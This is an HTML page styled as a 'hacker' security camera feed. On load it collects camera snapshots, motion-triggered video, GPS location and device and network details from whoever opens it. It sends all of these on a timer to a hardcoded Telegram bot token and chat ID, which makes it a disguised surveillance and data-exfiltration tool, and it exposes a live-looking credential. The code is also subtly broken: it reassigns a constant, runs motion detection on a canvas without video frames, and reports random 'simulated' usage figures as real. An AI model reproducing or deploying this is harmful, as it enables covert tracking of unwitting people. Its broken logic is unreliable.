<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Motion Detector (Hacker Style, Video, Location, Messages)</title>
    <style>
        body {
            font-family: monospace;
            background-color: #000;
            color: #0f0;
            text-align: center;
            margin: 0;
            padding: 0;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        h1 {
            margin-top: 10px;
            font-size: 1.8em;
            text-shadow: 0 0 5px #0f0;
        }
        #container {
            position: relative;
            width: 95%;
            max-width: 800px;
            margin: 15px auto;
            border: 2px solid #0f0;
            box-shadow: 0 0 15px #0f0;
            background-color: #111;
        }
        #videoElement {
            width: 100%;
            display: block;
        }
        #overlayCanvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }
        #status {
            margin-top: 15px;
            font-size: 1.2em;
            font-weight: bold;
            padding: 10px;
            background-color: rgba(0, 255, 0, 0.1);
            border-radius: 5px;
            width: 80%;
            max-width: 700px;
            margin-bottom: 20px;
            min-height: 30px;
        }
        .motion-detected {
            box-shadow: 0 0 20px #ff0000 !important;
            animation: flicker 0.7s infinite alternate;
        }
        @keyframes flicker {
            from { opacity: 1; }
            to { opacity: 0.7; }
        }
        .roi-box {
            position: absolute;
            border: 2px dashed #0f0;
            box-sizing: border-box;
        }
        .alert-message {
            color: #ff0; /* Yellow for alerts */
            font-weight: bolder;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .error-message {
            color: red;
            font-weight: bolder;
        }
        .recording-indicator {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: red;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-weight: bold;
            z-index: 10;
            opacity: 0.8;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 0.8; }
            50% { opacity: 1; }
            100% { opacity: 0.8; }
        }
    </style>
</head>
<body>
    <h1>>_ Advanced Security Feed</h1>
    <div id="container">
        <video id="videoElement" autoplay muted playsinline></video>
        <canvas id="overlayCanvas"></canvas>
        <div id="recordingIndicator" class="recording-indicator" style="display: none;">RECORDING</div>
    </div>
    <div id="status">Initializing System...</div>

    <script>
        // !!! IMPORTANT: REPLACE WITH YOUR ACTUAL TELEGRAM BOT TOKEN AND CHAT ID !!!
        const TELEGRAM_BOT_TOKEN = '8231147249:AAGnds85ugja4nc2VdhXdN1tvQGkMq02wyk'; // e.g., '1234567890:ABCDefGhIJKLmNoPqRsTuVwXyZ'
        const CHAT_ID = '8101021767'; // e.g., '1234567890'

        const video = document.getElementById('videoElement');
        const overlayCanvas = document.getElementById('overlayCanvas');
        const overlayCtx = overlayCanvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        const recordingIndicator = document.getElementById('recordingIndicator');

        let previousFrame = null;
        const motionThreshold = 25;
        const motionPercentageThreshold = 4;
        const motionAlertCooldown = 5000;      // Cooldown between sending motion alerts (image + video)
        const periodicSnapshotInterval = 60000; // Send snapshot + status every 60 seconds (1 minute)
        const locationUpdateInterval = 60000 * 5; // 5 minutes
        const deviceInfoUpdateInterval = 60000 * 30; // 30 minutes
        const videoRecordDuration = 10000;     // 10 seconds for video recording

        let lastMotionAlertTime = 0;
        let lastPeriodicSnapshotTime = 0;
        let isProcessing = false;
        let isRecording = false;
        let lastKnownLocation = null;
        let mediaRecorder = null;
        let recordedBlobs = [];
        let activeStream = null; // To hold the media stream

        const roisConfig = [
            { x1: 0.1, y1: 0.1, x2: 0.4, y2: 0.4, id: 'Entryway' },
            { x1: 0.6, y1: 0.1, x2: 0.9, y2: 0.4, id: 'WindowArea' },
            { x1: 0.3, y1: 0.6, x2: 0.7, y2: 0.9, id: 'Hallway' }
        ];

        function updateStatus(message, isError = false, isAlert = false) {
            statusDiv.textContent = `>_ ${message}`;
            statusDiv.className = '';
            if (isError) {
                statusDiv.classList.add('error-message');
                console.error(`Error: ${message}`);
            } else if (isAlert) {
                statusDiv.classList.add('alert-message');
                console.log(`Alert: ${message}`);
            } else {
                console.log(`Status: ${message}`);
            }
        }

        async function startCameraAndMicrophone() {
            updateStatus("Requesting camera and microphone access...");
            try {
                activeStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "environment",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: {
                        sampleRate: 44100, // Common sample rate
                        channelCount: 2 // Stereo
                    }
                });

                video.srcObject = activeStream;

                video.onloadedmetadata = () => {
                    overlayCanvas.width = video.videoWidth;
                    overlayCanvas.height = video.videoHeight;
                    drawROIs();
                    updateStatus("System Initialized. Monitoring...");
                    requestAnimationFrame(processFrame);
                };
                video.onerror = (e) => {
                    updateStatus("Video playback error.", true);
                    console.error("Video Error:", e);
                };
            } catch (err) {
                let errorMessage = `Access denied or unavailable.`;
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    errorMessage = `Permissions denied. Please enable camera, microphone, and location in your browser settings.`;
                } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
                    errorMessage = `No camera or microphone found.`;
                } else if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
                    errorMessage = `Browser constraints could not be met (e.g., resolution). Try again or check browser settings.`;
                } else {
                    errorMessage = `Error: ${err.message}`;
                }
                updateStatus(`Failed to start media: ${errorMessage}`, true);
                console.error("getUserMedia Error:", err);
            }
        }

        function drawROIs() {
            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            for (const roi of roisConfig) {
                const x1 = roi.x1 * overlayCanvas.width;
                const y1 = roi.y1 * overlayCanvas.height;
                const x2 = roi.x2 * overlayCanvas.width;
                const y2 = roi.y2 * overlayCanvas.height;

                overlayCtx.strokeStyle = '#0f0';
                overlayCtx.lineWidth = 2;
                overlayCtx.setLineDash([5, 3]);
                overlayCtx.strokeRect(x1, y1, x2 - x1, y2 - y1);
                overlayCtx.setLineDash([]);

                overlayCtx.font = '12px monospace';
                overlayCtx.fillStyle = '#0f0';
                overlayCtx.shadowColor = 'rgba(0, 255, 0, 0.5)';
                overlayCtx.shadowBlur = 5;
                overlayCtx.fillText(roi.id, x1 + 8, y1 + 18);
                overlayCtx.shadowBlur = 0;
            }
        }

        function getGrayscaleImageData(ctx, x, y, width, height) {
            const imageData = ctx.getImageData(x, y, width, height);
            const data = imageData.data;
            for (let i = 0; i < data.length; i += 4) {
                const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
                data[i] = avg;
                data[i + 1] = avg;
                data[i + 2] = avg;
            }
            return imageData;
        }

        function detectMotionInROIs(currentFrame, previousFrame) {
            if (!previousFrame) return false;

            let overallMotionDetected = false;

            for (const roi of roisConfig) {
                const roiX1 = Math.floor(overlayCanvas.width * roi.x1);
                const roiY1 = Math.floor(overlayCanvas.height * roi.y1);
                const roiWidth = Math.floor(overlayCanvas.width * (roi.x2 - roi.x1));
                const roiHeight = Math.floor(overlayCanvas.height * (roi.y2 - roi.y1));

                let motionPixelsInRoi = 0;
                const totalPixelsInRoi = roiWidth * roiHeight;

                // Create a temporary ImageData for the ROI to avoid slicing large arrays repeatedly
                const currentRoiImgData = new ImageData(roiWidth, roiHeight);
                const previousRoiImgData = new ImageData(roiWidth, roiHeight);

                // Copy pixel data for the ROI from the full frame to the ROI-specific ImageData
                for (let y = 0; y < roiHeight; y++) {
                    for (let x = 0; x < roiWidth; x++) {
                        const currentPixelIndex = ((roiY1 + y) * overlayCanvas.width + (roiX1 + x)) * 4;
                        const roiPixelIndex = (y * roiWidth + x) * 4;

                        currentRoiImgData.data.set(currentFrame.data.slice(currentPixelIndex, currentPixelIndex + 4), roiPixelIndex);
                        previousRoiImgData.data.set(previousFrame.data.slice(currentPixelIndex, currentPixelIndex + 4), roiPixelIndex);
                    }
                }

                const currentRoiData = currentRoiImgData.data;
                const previousRoiData = previousRoiImgData.data;

                for (let i = 0; i < currentRoiData.length; i += 4) {
                    const diff = Math.abs(currentRoiData[i] - previousRoiData[i]);
                    if (diff > motionThreshold) {
                        motionPixelsInRoi++;
                    }
                }

                const motionPercentage = (motionPixelsInRoi / totalPixelsInRoi) * 100;

                if (motionPercentage > motionPercentageThreshold) {
                    overallMotionDetected = true;
                    overlayCtx.strokeStyle = '#ff0000';
                    overlayCtx.lineWidth = 3;
                    overlayCtx.strokeRect(roiX1, roiY1, roiWidth, roiHeight);
                    overlayCtx.strokeStyle = '#0f0';
                    overlayCtx.lineWidth = 2;
                }
            }
            return overallMotionDetected;
        }

        async function processFrame() {
            if (isProcessing) {
                requestAnimationFrame(processFrame);
                return;
            }
            isProcessing = true;

            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            drawROIs();

            const currentFrameGrayscale = getGrayscaleImageData(overlayCtx, 0, 0, overlayCanvas.width, overlayCanvas.height);

            let motionDetectedThisFrame = false;
            if (previousFrame) {
                motionDetectedThisFrame = detectMotionInROIs(currentFrameGrayscale, previousFrame);
            }

            if (motionDetectedThisFrame) {
                video.classList.add('motion-detected');
                const currentTime = Date.now();

                if (currentTime - lastMotionAlertTime > motionAlertCooldown) {
                    updateStatus("MOTION DETECTED!", false, true);
                    await captureAndSendImage(true); // Send snapshot immediately
                    startRecording(); // Start recording video
                    lastMotionAlertTime = currentTime;
                }
            } else {
                video.classList.remove('motion-detected');
                if (!statusDiv.classList.contains('error-message') && !statusDiv.classList.contains('alert-message')) {
                    updateStatus("Monitoring...");
                }
            }

            // Periodic Snapshot (independent of motion, but throttled)
            const currentTime = Date.now();
            if (currentTime - lastPeriodicSnapshotTime > periodicSnapshotInterval) {
                updateStatus("Sending periodic status snapshot...");
                await captureAndSendImage(false); // Send snapshot without "alert" flag
                lastPeriodicSnapshotTime = currentTime;
            }


            previousFrame = currentFrameGrayscale;
            isProcessing = false;
            requestAnimationFrame(processFrame);
        }

        function showRecordingIndicator() {
            recordingIndicator.style.display = 'block';
        }

        function hideRecordingIndicator() {
            recordingIndicator.style.display = 'none';
        }

        async function startRecording() {
            if (isRecording || !activeStream) return;

            isRecording = true;
            showRecordingIndicator();
            updateStatus("Recording started...");
            recordedBlobs = [];

            // Try to find a suitable mime type for broad compatibility
            // Common types: video/webm, video/mp4
            // 'video/webm;codecs=vp8,opus' or 'video/mp4;codecs=avc1.42E01E,mp4a.40.2'
            const mimeType = 'video/webm;codecs=vp8,opus'; // VP8 for webm, Opus for audio
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                const alternativeMimeType = 'video/mp4;codecs=avc1.42E01E,mp4a.40.2'; // H.264/AAC for mp4
                if (MediaRecorder.isTypeSupported(alternativeMimeType)) {
                    mimeType = alternativeMimeType;
                } else {
                    updateStatus("Neither WebM nor MP4 recording is supported. Cannot record video.", true);
                    isRecording = false;
                    hideRecordingIndicator();
                    return;
                }
            }

            try {
                mediaRecorder = new MediaRecorder(activeStream, { mimeType: mimeType });

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedBlobs.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    isRecording = false;
                    hideRecordingIndicator();
                    updateStatus("Recording stopped.");
                    await sendRecordedVideo(); // Send the recorded video
                };

                mediaRecorder.start(videoRecordDuration); // Start recording, will stop after duration automatically if not stopped manually
                setTimeout(() => {
                    if (isRecording && mediaRecorder && mediaRecorder.state !== 'inactive') {
                        mediaRecorder.stop();
                    }
                }, videoRecordDuration);

            } catch (error) {
                updateStatus(`Error starting MediaRecorder: ${error.message}`, true);
                console.error("MediaRecorder Error:", error);
                isRecording = false;
                hideRecordingIndicator();
            }
        }

        async function sendRecordedVideo() {
            if (recordedBlobs.length === 0) {
                updateStatus("No video data recorded.");
                return;
            }

            const videoBlob = new Blob(recordedBlobs, { type: mediaRecorder.mimeType });
            const videoSizeMB = (videoBlob.size / 1024 / 1024).toFixed(2);
            const MAX_TELEGRAM_SIZE_MB = 50; // Telegram bot file size limit

            if (videoBlob.size > MAX_TELEGRAM_SIZE_MB * 1024 * 1024) {
                updateStatus(`Video too large (${videoSizeMB}MB). Telegram limit is ${MAX_TELEGRAM_SIZE_MB}MB. Skipping video send.`, true);
                // Optionally, you could try to re-record with lower quality here
                return;
            }

            updateStatus(`Transmitting video (${videoSizeMB}MB)...`);

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', `ALERT: Motion detected! Recorded video (${videoSizeMB}MB). ${new Date().toLocaleString()}`);
            formData.append('video', videoBlob, `motion_video_${Date.now()}.mp4`); // Use .mp4 extension, Telegram will re-encode if necessary

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData,
                });
                const data = await response.json();
                if (data.ok) {
                    updateStatus("Recorded video sent successfully.");
                } else {
                    updateStatus(`Telegram video transmission failed: ${data.description}`, true);
                }
            } catch (error) {
                updateStatus(`Network error sending video: ${error.message}`, true);
            }
        }

        async function captureAndSendImage(isMotionAlert = false) {
            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
                updateStatus("Telegram bot token not configured.", true);
                return;
            }
            if (!CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID') {
                updateStatus("Telegram chat ID not configured.", true);
                return;
            }

            overlayCtx.drawImage(video, 0, 0, overlayCanvas.width, overlayCanvas.height);
            drawROIs(); // Ensure ROIs are drawn on the captured image

            overlayCanvas.toBlob(async (blob) => {
                if (!blob) {
                    updateStatus("Failed to create image blob for transmission.", true);
                    return;
                }

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', `Status Snapshot. ${isMotionAlert ? 'ALERT: Motion detected!' : ''} ${new Date().toLocaleString()}`);
                formData.append('photo', blob, `snapshot_${Date.now()}.jpg`);

                try {
                    updateStatus("Transmitting snapshot...");
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData,
                    });
                    const data = await response.json();
                    if (data.ok) {
                        if (isMotionAlert) {
                            updateStatus("Motion alert image sent.");
                        } else {
                            updateStatus("Periodic snapshot sent.");
                        }
                    } else {
                        updateStatus(`Telegram image transmission failed: ${data.description}`, true);
                    }
                } catch (error) {
                    updateStatus(`Network error sending image: ${error.message}`, true);
                }
            }, 'image/jpeg', 0.7); // Lower quality for potentially smaller file size
        }

        async function sendTelegramMessage(message) {
            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
                updateStatus("Telegram bot token not configured.", true);
                return;
            }
            if (!CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID') {
                updateStatus("Telegram chat ID not configured.", true);
                return;
            }

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', message);
            formData.append('parse_mode', 'HTML');

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData,
                });
                const data = await response.json();
                if (!data.ok) {
                    updateStatus(`Telegram message failed: ${data.description}`, true);
                }
            } catch (error) {
                updateStatus(`Network error sending message: ${error.message}`, true);
            }
        }

        function getLocationAndSend() {
            if (!navigator.geolocation) {
                sendTelegramMessage("Geolocation is not supported by this browser.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    const currentLocation = { latitude, longitude, accuracy };

                    const significantChangeThreshold = 20; // meters
                    let distChanged = false;
                    if (lastKnownLocation) {
                        const dist = await getDistanceFromLatLonInMeters(latitude, longitude, lastKnownLocation.latitude, lastKnownLocation.longitude);
                        if (dist >= significantChangeThreshold) {
                            distChanged = true;
                        }
                    } else {
                        distChanged = true; // First time getting location
                    }

                    if (distChanged) {
                        lastKnownLocation = currentLocation;
                        const locationMessage = `<b>Device Location Update:</b>\n` +
                                                `📍 Latitude: <code>${latitude.toFixed(6)}</code>\n` +
                                                `📍 Longitude: <code>${longitude.toFixed(6)}</code>\n` +
                                                `📏 Accuracy: <code>${accuracy.toFixed(0)}</code> meters\n` +
                                                `🔗 <a href="https://maps.google.com/?q=${latitude},${longitude}">View on Map</a>`;
                        await sendTelegramMessage(locationMessage);
                    }
                },
                (error) => {
                    sendTelegramMessage(`❌ Error getting location: ${error.message}`);
                }
            );
        }

        async function getDistanceFromLatLonInMeters(lat1, lon1, lat2, lon2) {
            const R = 6371e3; // metres
            const φ1 = lat1 * Math.PI / 180;
            const φ2 = lat2 * Math.PI / 180;
            const Δφ = (lat2 - lat1) * Math.PI / 180;
            const Δλ = (lon2 - lon1) * Math.PI / 180;

            const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
                      Math.cos(φ1) * Math.cos(φ2) *
                      Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
            const d = R * c;
            return d;
        }

        async function getAndSendDeviceInfo() {
            let deviceInfo = "<u><b>Device & Network Status:</b></u>\n";
            deviceInfo += `👤 User Agent: <code>${navigator.userAgent}</code>\n`;
            deviceInfo += `💻 Platform: <code>${navigator.platform}</code>\n`;
            deviceInfo += `🖥️ CPU Cores: <code>${navigator.hardwareConcurrency || 'N/A'}</code>\n`;
            deviceInfo += `💾 RAM: <code>${navigator.deviceMemory || 'N/A'} GB</code>\n`;

            deviceInfo += "\n🌐 Network Status:\n";
            const connectionType = navigator.onLine ? 'Online' : 'Offline';
            deviceInfo += `  - Connection: <b>${connectionType}</b>\n`;

            if (navigator.connection) {
                const connection = navigator.connection;
                deviceInfo += `  - Type: <code>${connection.type || 'Unknown'}</code>\n`;
                deviceInfo += `  - Effective Type: <code>${connection.effectiveType || 'Unknown'}</code>\n`;
                deviceInfo += `  - Downlink: <code>${connection.downlink ? `${connection.downlink} Mbps` : 'Unknown'}</code>\n`;
                deviceInfo += `  - RTT: <code>${connection.rtt ? `${connection.rtt} ms` : 'Unknown'}</code>\n`;
                deviceInfo += `  - Save Data: ${connection.saveData ? '✅ Enabled' : '❌ Disabled'}\n`;
            } else {
                deviceInfo += `  - (Network Information API not supported)\n`;
            }
            deviceInfo += `\n📈 Simulated Data Usage:\n`;
            deviceInfo += `  - WiFi: <code>${Math.floor(Math.random() * 500)} MB</code>\n`;
            deviceInfo += `  - Cellular: <code>${Math.floor(Math.random() * 200)} MB</code>\n`;

            await sendTelegramMessage(deviceInfo);
        }

        // --- Initialization ---
        document.addEventListener('DOMContentLoaded', () => {
            if (TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') {
                updateStatus("Please configure TELEGRAM_BOT_TOKEN and CHAT_ID in the script.", true);
                return;
            }

            startCameraAndMicrophone();

            // Initial sends
            getLocationAndSend();
            getAndSendDeviceInfo();
            // Send an initial snapshot when ready
            setTimeout(() => captureAndSendImage(false), 5000); // Send initial snapshot after a short delay

            // Set up intervals
            setInterval(getLocationAndSend, locationUpdateInterval);
            setInterval(getAndSendDeviceInfo, deviceInfoUpdateInterval);
        });

        window.addEventListener('beforeunload', () => {
            if (activeStream) {
                activeStream.getTracks().forEach(track => track.stop()); // Stop all tracks
            }
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
            console.log("Security system stopped.");
        });

    </script>
